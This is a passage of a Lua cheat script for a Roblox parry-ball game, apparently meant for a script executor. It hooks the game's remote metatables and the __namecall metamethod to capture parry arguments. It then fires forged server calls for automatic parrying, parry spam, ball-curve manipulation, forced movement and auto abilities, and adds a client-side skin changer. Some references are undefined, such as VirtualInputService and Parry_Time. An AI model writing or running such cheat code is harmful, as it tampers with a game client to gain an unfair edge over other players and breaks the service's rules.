local main = Library.new()

local rage = main:create_tab('Autoparry', 'rbxassetid://76499042599127')
local set = main:create_tab('Spam', 'rbxassetid://10709781460')
local pl = main:create_tab('Player', 'rbxassetid://126017907477623')
local visuals = main:create_tab('Visuals', 'rbxassetid://10723346959')
local world = main:create_tab('World', 'rbxassetid://10734897102')
local misc = main:create_tab('Misc', 'rbxassetid://132243429647479')
local guiset = main:create_tab('GUI', 'rbxassetid://10734887784')
local devuwu = main:create_tab('Exclusive', 'rbxassetid://10734966248')

repeat task.wait() until game:IsLoaded()
local Players = game:GetService('Players')
local Player = Players.LocalPlayer
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local Tornado_Time = tick()
local UserInputService = game:GetService('UserInputService')
local Debris = game:GetService('Debris')
local Grab_Parry = nil
local Speed_Divisor_Multiplier = 1.1
local ParryThreshold = 2.5
local VirtualInputManager = game:GetService("VirtualInputManager")
local LocalPlayer = Players.LocalPlayer

local Runtime = workspace.Runtime

local Alive = workspace:FindFirstChild("Alive") or workspace:WaitForChild("Alive")

local variables = {
    triggerbot_parried = false,
    targetplayer = nil,
    firstParryDone = false,
    parries = 0,

    toggles = {
        manualspampc = false,
        manualspampclegit = false,
        triggerbot = false,
    }
}

local autoparrygrabanimation = false
local TriggerBot = false

local revertedRemotes = {}
local originalMetatables = {}
local Parry_Key = nil

local function isValidRemoteArgs(args)
    return #args == 7 and
        type(args[2]) == "string" and
        type(args[3]) == "number" and
        typeof(args[4]) == "CFrame" and
        type(args[5]) == "table" and
        type(args[6]) == "table" and
        type(args[7]) == "boolean"
end

local function hookRemote(remote)
    if not revertedRemotes[remote] then
        if not originalMetatables[getrawmetatable(remote)] then
            originalMetatables[getrawmetatable(remote)] = true
            local meta = getrawmetatable(remote)
            setreadonly(meta, false)

            local oldIndex = meta.__index
            meta.__index = function(self, key)
                if (key == "FireServer" and self:IsA("RemoteEvent")) or
                    (key == "InvokeServer" and self:IsA("RemoteFunction")) then
                    return function(_, ...)
                        local args = {...}
                        if isValidRemoteArgs(args) and not revertedRemotes[self] then
                            revertedRemotes[self] = args
                            Parry_Key = args[2]
                        end
                        return oldIndex(self, key)(_, unpack(args))
                    end
                end
                return oldIndex(self, key)
            end
            setreadonly(meta, true)
        end
    end
end

for _, remote in pairs(ReplicatedStorage:GetChildren()) do
    if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
        hookRemote(remote)
    end
end

ReplicatedStorage.ChildAdded:Connect(function(child)
    if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
        hookRemote(child)
    end
end)

local PF
local SC = nil

if ReplicatedStorage:FindFirstChild("Controllers") then
    for _, child in ipairs(ReplicatedStorage.Controllers:GetChildren()) do
        if child.Name:match("^SwordsController%s*$") then
            SC = child
        end
    end
end

if Player.PlayerGui:FindFirstChild("Hotbar") and Player.PlayerGui.Hotbar:FindFirstChild("Block") then
    for _, v in next, getconnections(Player.PlayerGui.Hotbar.Block.Activated) do
        if SC and getfenv(v.Function).script == SC then
            PF = v.Function
            break
        end
    end
end

getgenv().skinChanger = false
getgenv().swordModel = ""
getgenv().swordAnimations = ""
getgenv().swordFX = ""

local rs = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Player = Players.LocalPlayer

local swordInstancesInstance = rs:WaitForChild("Shared", 9e9):WaitForChild("ReplicatedInstances", 9e9):WaitForChild("Swords", 9e9)
local swordInstances = require(swordInstancesInstance)

local swordsController

while task.wait() and not swordsController do
    for _, v in getconnections(rs.Remotes.FireSwordInfo.OnClientEvent) do
        if v.Function and islclosure(v.Function) then
            local upvalues = getupvalues(v.Function)
            if #upvalues == 1 and type(upvalues[1]) == "table" then
                swordsController = upvalues[1]
                break
            end
        end
    end
end

function getSlashName(swordName)
    local slashData = swordInstances:GetSword(swordName)
    return (slashData and slashData.SlashName) or "SlashEffect"
end

function setSword()
    if not getgenv().skinChanger then return end
    setupvalue(rawget(swordInstances, "EquipSwordTo"), 2, false)
    swordInstances:EquipSwordTo(Player.Character, getgenv().swordModel)
    swordsController:SetSword(getgenv().swordAnimations)
end

local playParryFunc
local parrySuccessAllConnection

while task.wait() and not parrySuccessAllConnection do
    for _, v in getconnections(rs.Remotes.ParrySuccessAll.OnClientEvent) do
        if v.Function and getinfo(v.Function).name == "parrySuccessAll" then
            parrySuccessAllConnection = v
            playParryFunc = v.Function
            v:Disable()
        end
    end
end

local parrySuccessClientConnection
while task.wait() and not parrySuccessClientConnection do
    for _, v in getconnections(rs.Remotes.ParrySuccessClient.Event) do
        if v.Function and getinfo(v.Function).name == "parrySuccessAll" then
            parrySuccessClientConnection = v
            v:Disable()
        end
    end
end

getgenv().slashName = getSlashName(getgenv().swordFX)

local lastOtherParryTimestamp = 0
local clashConnections = {}

--quando chegar no AP
rs.Remotes.ParrySuccessAll.OnClientEvent:Connect(function(...)
    setthreadidentity(2)
    local args = {...}
    if tostring(args[4]) ~= Player.Name then
        lastOtherParryTimestamp = tick()
    elseif getgenv().skinChanger then
        args[1] = getgenv().slashName
        args[3] = getgenv().swordFX
    end
    return playParryFunc(unpack(args))
end)

table.insert(clashConnections, getconnections(rs.Remotes.ParrySuccessAll.OnClientEvent)[1])

getgenv().updateSword = function()
    getgenv().slashName = getSlashName(getgenv().swordFX)
    setSword()
end

--LA embaixo no skin changer button
local originalSwordModelName = nil
local originalSwordAnimationName = nil
local originalSwordFXName = nil

task.spawn(function()
    while task.wait(1) do
        if getgenv().skinChanger then
            local char = Player.Character or Player.CharacterAdded:Wait()
            if Player:GetAttribute("CurrentlyEquippedSword") ~= getgenv().swordModel then
                setSword()
            end
            if char and not char:FindFirstChild(getgenv().swordModel) then
                setSword()
            end
            for _, v in pairs(char and char:GetChildren() or {}) do
                if v:IsA("Model") and v.Name ~= getgenv().swordModel then
                    v:Destroy()
                end
                task.wait()
            end
        end
    end
end)

local Parries = 0
local Auto_Parry = {}

local function PlayGrabParryAnimation()
    local character = Player.Character
    if not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")
    if not humanoid or not animator then return end
    local Current_Sword = character:GetAttribute("CurrentlyEquippedSword")
    if not Current_Sword then return end

    local SwordAPI = game:GetService("ReplicatedStorage").Shared.SwordAPI.Collection
    local Parry_Animation = SwordAPI.Default:FindFirstChild("GrabParry")
    if not Parry_Animation then return end

    local Sword_Data = game:GetService("ReplicatedStorage").Shared.ReplicatedInstances.Swords.GetSword:Invoke(Current_Sword)
    if not Sword_Data or not Sword_Data["AnimationType"] then return end

    for _, object in pairs(SwordAPI:GetChildren()) do
        if object.Name == Sword_Data["AnimationType"] then
            if object:FindFirstChild("GrabParry") or object:FindFirstChild("Grab") then
                local sword_animation_type = "GrabParry"
                if object:FindFirstChild("Grab") then
                    sword_animation_type = "Grab"
                end
                Parry_Animation = object[sword_animation_type]
            end
        end
    end

    if Grab_Parry and Grab_Parry.IsPlaying then
        Grab_Parry:Stop()
    end

    Grab_Parry = animator:LoadAnimation(Parry_Animation)
    Grab_Parry.Priority = Enum.AnimationPriority.Action4
    Grab_Parry:Play()
end

function Auto_Parry.Get_Balls()
    local Balls = {}

    for _, Instance in pairs(workspace.Balls:GetChildren()) do
        if Instance:GetAttribute('realBall') then
            Instance.CanCollide = false
            table.insert(Balls, Instance)
        end
    end
    return Balls
end

function Auto_Parry.Get_Ball()
    for _, Instance in pairs(workspace.Balls:GetChildren()) do
        if Instance:GetAttribute('realBall') then
            Instance.CanCollide = false
            return Instance
        end
    end
end

local Closest_Entity = nil

function Auto_Parry.Closest_Player()
    local Max_Distance = math.huge
    local Found_Entity = nil
    
    for _, Entity in pairs(workspace.Alive:GetChildren()) do
        if tostring(Entity) ~= tostring(Player) then
            if Entity.PrimaryPart then  -- Check if PrimaryPart exists
                local Distance = Player:DistanceFromCharacter(Entity.PrimaryPart.Position)
                if Distance < Max_Distance then
                    Max_Distance = Distance
                    Found_Entity = Entity
                end
            end
        end
    end
    
    Closest_Entity = Found_Entity
    return Found_Entity
end

function Auto_Parry:Get_Entity_Properties()
    Auto_Parry.Closest_Player()

    if not Closest_Entity then
        return false
    end

    local Entity_Velocity = Closest_Entity.PrimaryPart.Velocity
    local Entity_Direction = (Player.Character.PrimaryPart.Position - Closest_Entity.PrimaryPart.Position).Unit
    local Entity_Distance = (Player.Character.PrimaryPart.Position - Closest_Entity.PrimaryPart.Position).Magnitude

    return {
        Velocity = Entity_Velocity,
        Direction = Entity_Direction,
        Distance = Entity_Distance
    }
end

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

local current_curve = "Camera"

local function getClosestPlayerToCursor()
    if variables and variables.targetplayer and getgenv().SelectedTarget then
        return nil
    end

    local closest_player = nil
    local minimal_dot_product = -math.huge
    local camera = workspace.CurrentCamera
    local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end

    local mouse_location = UserInputService:GetMouseLocation()
    local ray = camera:ScreenPointToRay(mouse_location.X, mouse_location.Y)
    local pointer = CFrame.lookAt(ray.Origin, ray.Origin + ray.Direction)

    for _, player in pairs(Alive:GetChildren()) do
        if player == Player.Character then continue end
        if not player:FindFirstChild("HumanoidRootPart") then continue end

        local direction_to_player = (player.HumanoidRootPart.Position - camera.CFrame.Position).Unit
        local dot_product = pointer.LookVector:Dot(direction_to_player)

        if dot_product > minimal_dot_product then
            minimal_dot_product = dot_product
            closest_player = player
        end
    end

    return closest_player
end

local function getCurveCFrame()
    local camera = workspace.CurrentCamera
    local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return camera.CFrame end

    local targetPart

    if variables.targetplayer and getgenv().SelectedTarget then
        local targetPlayer = Players:FindFirstChild(getgenv().SelectedTarget)
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            targetPart = targetPlayer.Character.HumanoidRootPart
        end
    end

    if not targetPart then
        local closest = getClosestPlayerToCursor()
        if closest and closest:FindFirstChild("HumanoidRootPart") then
            targetPart = closest.HumanoidRootPart
        end
    end

    local target_pos = targetPart and targetPart.Position or (root.Position + workspace.CurrentCamera.CFrame.LookVector * 100)

    if current_curve == "Dot" then
        return CFrame.new(root.Position, target_pos)
    elseif current_curve == "Backwards" then
        local direction = (root.Position - target_pos).Unit
        local backwards_pos = root.Position + direction * 10000 + Vector3.new(0, 1000, 0)
        return CFrame.new(workspace.CurrentCamera.CFrame.Position, backwards_pos)
    elseif current_curve == "Random" then
        local directionToTarget = (target_pos - root.Position).Unit
        local random_offset
        repeat
            random_offset = Vector3.new(
                math.random(-4000, 4000),
                math.random(-4000, 4000),
                math.random(-4000, 4000)
            )
            local curveDirection = (target_pos + random_offset - root.Position).Unit
            local dot = directionToTarget:Dot(curveDirection)
        until dot < 0.95
        return CFrame.new(root.Position, target_pos + random_offset)
    elseif current_curve == "Accelerated" then
        return CFrame.new(root.Position, target_pos + Vector3.new(0, 5, 0))
    elseif current_curve == "Slow" then
        return CFrame.new(root.Position, target_pos + Vector3.new(0, -9e18, 0))
    elseif current_curve == "High" then
        return CFrame.new(root.Position, target_pos + Vector3.new(0, 9e18, 0))
    else
        return workspace.CurrentCamera.CFrame
    end
end

local function Parry()
    if variables.parries > 10000 then return end
    local cam = workspace.CurrentCamera
    local mouse = UserInputService:GetMouseLocation()

    local vec2Mouse = {mouse.X, mouse.Y}
    local TargetAimPlayer = nil

    if variables.targetplayer and getgenv().SelectedTarget then
        local targetPlayer = Players:FindFirstChild(getgenv().SelectedTarget)
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local pos = targetPlayer.Character.HumanoidRootPart.Position
            local screenPoint = cam:WorldToScreenPoint(pos)
            TargetAimPlayer = {screenPoint.X, screenPoint.Y}
        end
    end

    local eventData = {}
    for _, ent in pairs(Alive:GetChildren()) do
        if ent.PrimaryPart then
            local success, screenPoint = pcall(function()
                return cam:WorldToScreenPoint(ent.PrimaryPart.Position)
            end)
            if success then
                eventData[tostring(ent)] = screenPoint
            end
        end
    end

    local curveCFrame = getCurveCFrame()

    if not variables.firstParryDone then
        PF()
        variables.firstParryDone = true
        return
    end

    local finalAimTarget
    if TargetAimPlayer then
        finalAimTarget = TargetAimPlayer
    elseif isMobile then
        local viewport = cam.ViewportSize
        finalAimTarget = {viewport.X / 2, viewport.Y / 2}
    else
        finalAimTarget = vec2Mouse
    end

    for remote, originalArgs in pairs(revertedRemotes) do
        if autoparrygrabanimation then
            PlayGrabParryAnimation()
        end

        local modifiedArgs = {
            originalArgs[1],
            originalArgs[2],
            originalArgs[3],
            curveCFrame,
            eventData,
            finalAimTarget,
            originalArgs[7]
        }

        if remote:IsA("RemoteEvent") then
            remote:FireServer(unpack(modifiedArgs))
        elseif remote:IsA("RemoteFunction") then
            remote:InvokeServer(unpack(modifiedArgs))
        end
    end

    if Parries > 7 then return false end

    Parries += 1
    task.delay(0.5, function()
        if Parries > 0 then
            Parries -= 1
        end
    end)
end

local function spam()
    local cam = workspace.CurrentCamera
    local mouse = UserInputService:GetMouseLocation()
    local vec2Mouse = {mouse.X, mouse.Y}
    local eventData = {}

    for _, ent in pairs(Alive:GetChildren()) do
        if ent.PrimaryPart then
            local success, screenPoint = pcall(function()
                return cam:WorldToScreenPoint(ent.PrimaryPart.Position)
            end)
            if success then
                eventData[tostring(ent)] = screenPoint
            end
        end
    end

    local curveCFrame = getCurveCFrame()

    local finalAimTarget
    if isMobile then
        local viewport = cam.ViewportSize
        finalAimTarget = {viewport.X / 2, viewport.Y / 2}
    else
        finalAimTarget = vec2Mouse
    end

    for remote, originalArgs in pairs(revertedRemotes) do
        local modifiedArgs = {
            originalArgs[1],
            originalArgs[2],
            originalArgs[3],
            curveCFrame,
            eventData,
            finalAimTarget,
            originalArgs[7]
        }

        if remote:IsA("RemoteEvent") then
            remote:FireServer(unpack(modifiedArgs))
        elseif remote:IsA("RemoteFunction") then
            remote:InvokeServer(unpack(modifiedArgs))
        end
    end
end

local Lerp_Radians = 0
local Last_Warping = tick()

function Auto_Parry.Linear_Interpolation(a, b, time_volume)
    return a + (b - a) * time_volume
end

local Previous_Velocity = {}
local Curving = tick()

function Auto_Parry.Is_Curved()
    local Ball = Auto_Parry.Get_Ball()
    if not Ball then return false end

    local Zoomies = Ball:FindFirstChild('zoomies')
    if not Zoomies then return false end

    local Ping = game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue()
    local Velocity = Zoomies.VectorVelocity
    local Ball_Direction = Velocity.Unit

    local playerPos = Player.Character.PrimaryPart.Position
    local ballPos = Ball.Position
    local Direction = (playerPos - ballPos).Unit
    local Dot = Direction:Dot(Ball_Direction)
    local Speed = Velocity.Magnitude

    local Speed_Threshold = math.min(Speed / 100, 40)
    local Angle_Threshold = 40 * math.max(Dot, 0)
    local Distance = (playerPos - ballPos).Magnitude
    local Reach_Time = Distance / Speed - (Ping / 1000)

    local Ball_Distance_Threshold = 15 - math.min(Distance / 1000, 15) + Speed_Threshold

    local enemyProps = Auto_Parry:Get_Entity_Properties()
    if enemyProps then
        local base_enemy_distance = 60
        local max_enemy_distance = 450
        
        local dynamic_enemy_distance = math.min(
            base_enemy_distance + (Speed * 0.15),
            max_enemy_distance
        )

        local dynamic_ball_distance = math.min(30 + (Speed * 0.05), 200)
        
        if enemyProps.Distance <= dynamic_enemy_distance and Speed > 40 and Distance <= dynamic_ball_distance then
            return false
        end
    end

    if Distance <= 25 then
        return false
    end

    table.insert(Previous_Velocity, Velocity)
    if #Previous_Velocity > 4 then
        table.remove(Previous_Velocity, 1)
    end

    if Ball:FindFirstChild('AeroDynamicSlashVFX') then
        Debris:AddItem(Ball.AeroDynamicSlashVFX, 0)
        Tornado_Time = tick()
    end

    if Runtime:FindFirstChild('Tornado') then
        if (tick() - Tornado_Time) < ((Runtime.Tornado:GetAttribute("TornadoTime") or 1) + 0.314159) then
            return true
        end
    end

    local Enough_Speed = Speed > 160
    if Enough_Speed and Reach_Time > Ping / 10 then
        if Speed < 300 then
            Ball_Distance_Threshold = math.max(Ball_Distance_Threshold - 15, 15)
        elseif Speed > 300 and Speed < 600 then
            Ball_Distance_Threshold = math.max(Ball_Distance_Threshold - 16, 16)
        elseif Speed > 600 and Speed < 1000 then
            Ball_Distance_Threshold = math.max(Ball_Distance_Threshold - 17, 17)
        elseif Speed > 1000 and Speed < 1500 then
            Ball_Distance_Threshold = math.max(Ball_Distance_Threshold - 19, 19)
        elseif Speed > 1500 then
            Ball_Distance_Threshold = math.max(Ball_Distance_Threshold - 20, 20)
        end
    end

    if Distance < Ball_Distance_Threshold then
        return false
    end

    if Speed < 300 then
        if (tick() - Curving) < (Reach_Time / 1.2) then return true end
    elseif Speed >= 300 and Speed < 450 then
        if (tick() - Curving) < (Reach_Time / 1.21) then return true end
    elseif Speed > 450 and Speed < 600 then
        if (tick() - Curving) < (Reach_Time / 1.335) then return true end
    elseif Speed > 600 then
        if (tick() - Curving) < (Reach_Time / 1.5) then return true end
    end

    local Dot_Threshold = (0.5 - Ping / 1000)
    local Direction_Difference = (Ball_Direction - Velocity.Unit)
    local Direction_Similarity = Direction:Dot(Direction_Difference.Unit)
    local Dot_Difference = Dot - Direction_Similarity

    if Dot_Difference < Dot_Threshold then
        return true
    end

    local Clamped_Dot = math.clamp(Dot, -1, 1)
    local Radians = math.deg(math.asin(Clamped_Dot))

    Lerp_Radians = Auto_Parry.Linear_Interpolation(Lerp_Radians, Radians, 0.8)
    if Speed < 300 then
        if Lerp_Radians < 0.02 then
            Last_Warping = tick()
        end
        if (tick() - Last_Warping) < (Reach_Time / 1.19) then
            return true
        end
    else
        if Lerp_Radians < 0.018 then
            Last_Warping = tick()
        end
        if (tick() - Last_Warping) < (Reach_Time / 1.5) then
            return true
        end
    end

    if #Previous_Velocity == 4 then
        local Intended_Direction_Difference = (Ball_Direction - Previous_Velocity[1].Unit).Unit
        local Intended_Dot = Direction:Dot(Intended_Direction_Difference)
        local Intended_Dot_Difference = Dot - Intended_Dot

        local Intended_Direction_Difference2 = (Ball_Direction - Previous_Velocity[2].Unit).Unit
        local Intended_Dot2 = Direction:Dot(Intended_Direction_Difference2)
        local Intended_Dot_Difference2 = Dot - Intended_Dot2

        if Intended_Dot_Difference < Dot_Threshold or Intended_Dot_Difference2 < Dot_Threshold then
            return true
        end
    end

    local backwardsCurveDetected = false
    local backwardsAngleThreshold = 85

    local horizDirection = Vector3.new(playerPos.X - ballPos.X, 0, playerPos.Z - ballPos.Z)
    if horizDirection.Magnitude > 0 then
        horizDirection = horizDirection.Unit
    end

    local awayFromPlayer = -horizDirection

    local horizBallDir = Vector3.new(Ball_Direction.X, 0, Ball_Direction.Z)
    if horizBallDir.Magnitude > 0 then
        horizBallDir = horizBallDir.Unit
        local backwardsAngle = math.deg(math.acos(math.clamp(awayFromPlayer:Dot(horizBallDir), -1, 1)))
        if backwardsAngle < backwardsAngleThreshold then
            backwardsCurveDetected = true
        end
    end

    return (Dot < Dot_Threshold) or backwardsCurveDetected
end

function Auto_Parry:Get_Ball_Properties()
    local Ball = Auto_Parry.Get_Ball()

    local Ball_Velocity = Vector3.zero
    local Ball_Origin = Ball

    local Ball_Direction = (Player.Character.PrimaryPart.Position - Ball_Origin.Position).Unit
    local Ball_Distance = (Player.Character.PrimaryPart.Position - Ball.Position).Magnitude
    local Ball_Dot = Ball_Direction:Dot(Ball_Velocity.Unit)

    return {
        Velocity = Ball_Velocity,
        Direction = Ball_Direction,
        Distance = Ball_Distance,
        Dot = Ball_Dot
    }
end

function Auto_Parry.Spam_Service(self)
    local Ball = Auto_Parry.Get_Ball()

    local Entity = Auto_Parry.Closest_Player()

    if not Ball then
        return false
    end

    if not Entity or not Entity.PrimaryPart then
        return false
    end

    local Spam_Accuracy = 0

    local Velocity = Ball.AssemblyLinearVelocity
    local Speed = Velocity.Magnitude

    local Direction = (Player.Character.PrimaryPart.Position - Ball.Position).Unit
    local Dot = Direction:Dot(Velocity.Unit)

    local Target_Position = Entity.PrimaryPart.Position
    local Target_Distance = Player:DistanceFromCharacter(Target_Position)

    local Maximum_Spam_Distance = self.Ping + math.min(Speed / 6, 95)

    if self.Entity_Properties.Distance > Maximum_Spam_Distance then
        return Spam_Accuracy
    end

    if self.Ball_Properties.Distance > Maximum_Spam_Distance then
        return Spam_Accuracy
    end

    if Target_Distance > Maximum_Spam_Distance then
        return Spam_Accuracy
    end

    local Maximum_Speed = 5 - math.min(Speed / 5, 5)
    local Maximum_Dot = math.clamp(Dot, -1, 0) * Maximum_Speed

    Spam_Accuracy = Maximum_Spam_Distance - Maximum_Dot

    return Spam_Accuracy
end

local Connections_Manager = {}

local Parried = false

local AutoParry = true

local Balls = workspace:WaitForChild('Balls')
local CurrentBall = nil
local InputTask = nil
local Cooldown = 0.02
local RunTime = workspace:FindFirstChild("Runtime")

local function GetBall()
    for _, Ball in ipairs(Balls:GetChildren()) do
        if Ball:FindFirstChild("ff") then
            return Ball
        end
    end
    return nil
end

local function SpamInput(Label)
    if InputTask then return end
    InputTask = task.spawn(function()
        while AutoParry do
            Parry()
            task.wait(Cooldown)
        end
        InputTask = nil
    end)
end


local Players = game:GetService("Players")
local player10239123 = Players.LocalPlayer
local RunService = game:GetService("RunService")

if not player10239123 then return end

RunTime.ChildAdded:Connect(function(Object)
    local Name = Object.Name
    if getgenv().PhantomV2Detection then
        if Name == "maxTransmission" or Name == "transmissionpart" then
            local Weld = Object:FindFirstChildWhichIsA("WeldConstraint")
            if Weld then
                local Character = player10239123.Character or player10239123.CharacterAdded:Wait()
                if Character and Weld.Part1 == Character.HumanoidRootPart then
                    CurrentBall = GetBall()
                    Weld:Destroy()
    
                    if CurrentBall then
                        local FocusConnection
                        FocusConnection = RunService.RenderStepped:Connect(function()
                            local Highlighted = CurrentBall:GetAttribute("highlighted")
    
                            if Highlighted == true then
                                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 36
    
                                local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
                                if HumanoidRootPart then
                                    local PlayerPosition = HumanoidRootPart.Position
                                    local BallPosition = CurrentBall.Position
                                    local PlayerToBall = (BallPosition - PlayerPosition).Unit
    
                                    game.Players.LocalPlayer.Character.Humanoid:Move(PlayerToBall, false)
                                end
    
                            elseif Highlighted == false then
                                FocusConnection:Disconnect()
    
                                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 10
                                game.Players.LocalPlayer.Character.Humanoid:Move(Vector3.new(0, 0, 0), false)
    
                                task.delay(3, function()
                                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 36
                                end)
    
                                CurrentBall = nil
                            end
                        end)
    
                        task.delay(3, function()
                            if FocusConnection and FocusConnection.Connected then
                                FocusConnection:Disconnect()
    
                                game.Players.LocalPlayer.Character.Humanoid:Move(Vector3.new(0, 0, 0), false)
                                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 36
                                CurrentBall = nil
                            end
                        end)
                    end
                end
            end
        end
    end
end)

Balls.ChildAdded:Connect(function(Value)
    Value.ChildAdded:Connect(function(Child)
        if getgenv().SlashOfFuryDetection and Child.Name == 'ComboCounter' then
            local Sof_Label = Child:FindFirstChildOfClass('TextLabel')

            if Sof_Label then
                repeat
                    local Slashes_Counter = tonumber(Sof_Label.Text)

                    if Slashes_Counter and Slashes_Counter < 32 then
                        Parry()
                    end

                    task.wait()

                until not Sof_Label.Parent or not Sof_Label
            end
        end
    end)
end)

local player11 = game.Players.LocalPlayer
local playerGui = player11:WaitForChild("PlayerGui")

local ParryCD = playerGui.Hotbar.Block.UIGradient
local AbilityCD = playerGui.Hotbar.Ability.UIGradient

local function isCooldownInEffect1(uigradient)
    return uigradient.Offset.Y < 0.4
end

local function isCooldownInEffect2(uigradient)
    return uigradient.Offset.Y == 0.5
end

local function cooldownProtection()
    if isCooldownInEffect1(ParryCD) then
        game:GetService("ReplicatedStorage").Remotes.AbilityButtonPress:Fire()
        return true
    end
    return false
end

local function AutoAbility()
    local AbilityGui = LocalPlayer.PlayerGui.Hotbar.Ability.UIGradient
    if isCooldownInEffect2(AbilityCD) then
        if Player.Character.Abilities["Raging Deflection"].Enabled or Player.Character.Abilities["Rapture"].Enabled or Player.Character.Abilities["Calming Deflection"].Enabled or Player.Character.Abilities["Aerodynamic Slash"].Enabled or Player.Character.Abilities["Fracture"].Enabled or Player.Character.Abilities["Death Slash"].Enabled then
            Parried = true
            game:GetService("ReplicatedStorage").Remotes.AbilityButtonPress:Fire()
            task.wait(2.432)
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("DeathSlashShootActivation"):FireServer(true)
            return true
        end
    end
    return false
end

    local module = rage:create_module({
        title = 'Auto Parry',
        flag = 'Auto_Parry',
        description = 'Automatically parries ball',
        section = 'left',
        callback = function(value: boolean)
            if getgenv().AutoParryNotify then
                if value then
                    Library.SendNotification({
                        title = "Auto Parry Notification",
                        text = "Auto Parry has been turned ON",
                        duration = 3
                    })
                else
                    Library.SendNotification({
                        title = "Auto Parry Notification",
                        text = "Auto Parry has been turned OFF",
                        duration = 3
                    })
                end
            end
            if value then
                Connections_Manager['Auto Parry'] = RunService.PreSimulation:Connect(function()
                    local One_Ball = Auto_Parry.Get_Ball()
                    local Balls = Auto_Parry.Get_Balls()

                    for _, Ball in pairs(Balls) do

                        if TriggerBot then
                            return
                        end

                        if not Ball then
                            return
                        end

                        local Zoomies = Ball:FindFirstChild('zoomies')
                        if not Zoomies then
                            return
                        end

                        Ball:GetAttributeChangedSignal('target'):Once(function()
                            Parried = false
                        end)

                        if Parried then
                            return
                        end

                        local Ball_Target = Ball:GetAttribute('target')
                        local One_Target = One_Ball:GetAttribute('target')

                        local Velocity = Zoomies.VectorVelocity

                        local Distance = (Player.Character.PrimaryPart.Position - Ball.Position).Magnitude

                        local Ping = game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue() / 10

                        local Ping_Threshold = math.clamp(Ping / 10, 5, 17)

                        local Speed = Velocity.Magnitude

                        local cappedSpeedDiff = math.min(math.max(Speed - 9.5, 0), 650)
                        local speed_divisor_base = 2.4 + cappedSpeedDiff * 0.002

                        local effectiveMultiplier = Speed_Divisor_Multiplier
                        if getgenv().RandomParryAccuracyEnabled then
                            if Speed < 200 then
                                effectiveMultiplier = 0.7 + (math.random(40, 100) - 1) * (0.35 / 99)
                            else
                                effectiveMultiplier = 0.7 + (math.random(1, 100) - 1) * (0.35 / 99)
                            end
                        end

                        local speed_divisor = speed_divisor_base * effectiveMultiplier
                        local Parry_Accuracy = Ping_Threshold + math.max(Speed / speed_divisor, 9.5)

                        local Curved = Auto_Parry.Is_Curved()

                        if Ball:FindFirstChild('AeroDynamicSlashVFX') then
                            Debris:AddItem(Ball.AeroDynamicSlashVFX, 0)
                            Tornado_Time = tick()
                        end

                        if Runtime:FindFirstChild('Tornado') then
                            if (tick() - Tornado_Time) < (Runtime.Tornado:GetAttribute("TornadoTime") or 1) + 0.314159 then
                            return
                            end
                        end

                        if One_Target == tostring(Player) and Curved then
                            return
                        end

                        if Ball:FindFirstChild("ComboCounter") then
                            return
                        end

                        local Singularity_Cape = Player.Character.PrimaryPart:FindFirstChild('SingularityCape')
                        if Singularity_Cape then
                            return
                        end 

                        if Ball_Target == tostring(Player) and Distance <= Parry_Accuracy then
                            if getgenv().AutoAbility and AutoAbility() then
                                return
                            end
                        end

                        if Ball_Target == tostring(Player) and Distance <= Parry_Accuracy then
                            if getgenv().CooldownProtection and cooldownProtection() then
                                return
                            end

                            if getgenv().AutoParryKeypress then
                                VirtualInputService:SendKeyEvent(true, Enum.KeyCode.F, false, nil)
                            else
                                Parry()
                            end

                            Last_Parry = Parry_Time
                            Parried = true
                        end
                        local Last_Parrys = tick()
                        repeat
                            RunService.PreSimulation:Wait()
                        until (tick() - Last_Parrys) >= 1 or not Parried
                        Parried = false
                    end
                end)
            else
                if Connections_Manager['Auto Parry'] then
                    Connections_Manager['Auto Parry']:Disconnect()
                    Connections_Manager['Auto Parry'] = nil
                end
            end
        end
    })


local ninja_dash_fired = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net"):WaitForChild("RE/NinjaDash")

local __namecall
__namecall = hookmetamethod(game, '__namecall', function(self, ...)
    if self == ninja_dash_fired and getnamecallmethod() == 'FireServer' then
        Parried = true

        task.delay(0.5155, function()
            Parried = false
        end)
    end

    return __namecall(self, ...)
end)


    module:create_checkbox({
        title = "Notify",
        flag = "Auto_Parry_Notify",
        callback = function(value: boolean)
            getgenv().AutoParryNotify = value
        end
    })

local curveOptions = {"Camera", "Random", "Dot", "Backwards", "Slow", "Accelerated", "High"}

local AutoCurveDropdown = module:create_dropdown({
    title = "AutoCurve",
    flag = "curve_type",
    options = curveOptions,
    multi_dropdown = false,
    maximum_options = 8,
    callback = function(value)
        current_curve = value
    end
})

    module:create_slider({
        title = 'Parry Accuracy',
        flag = 'Parry_Accuracy',

        maximum_value = 100,
        minimum_value = 1,
        value = 100,

        round_number = false,

        callback = function(value: boolean)
            Speed_Divisor_Multiplier = 0.555 + (value - 1) * (0.35 / 99)
        end
    })

    module:create_divider({
    })

    module:create_checkbox({
        title = "Cooldown Protection",
        flag = "CooldownProtection",
        callback = function(value: boolean)
            getgenv().CooldownProtection = value
        end
    })

    module:create_checkbox({
        title = "Auto Ability",
        flag = "AutoAbility",
        callback = function(value: boolean)
            getgenv().AutoAbility = value
        end
    })

    module:create_checkbox({
        title = "Anti-Phantom[BETA]",
        flag = "Anti_Phantom",
        callback = function(value: boolean)
            getgenv().PhantomV2Detection = value
        end
    })

    module:create_divider({
    })

    module:create_checkbox({
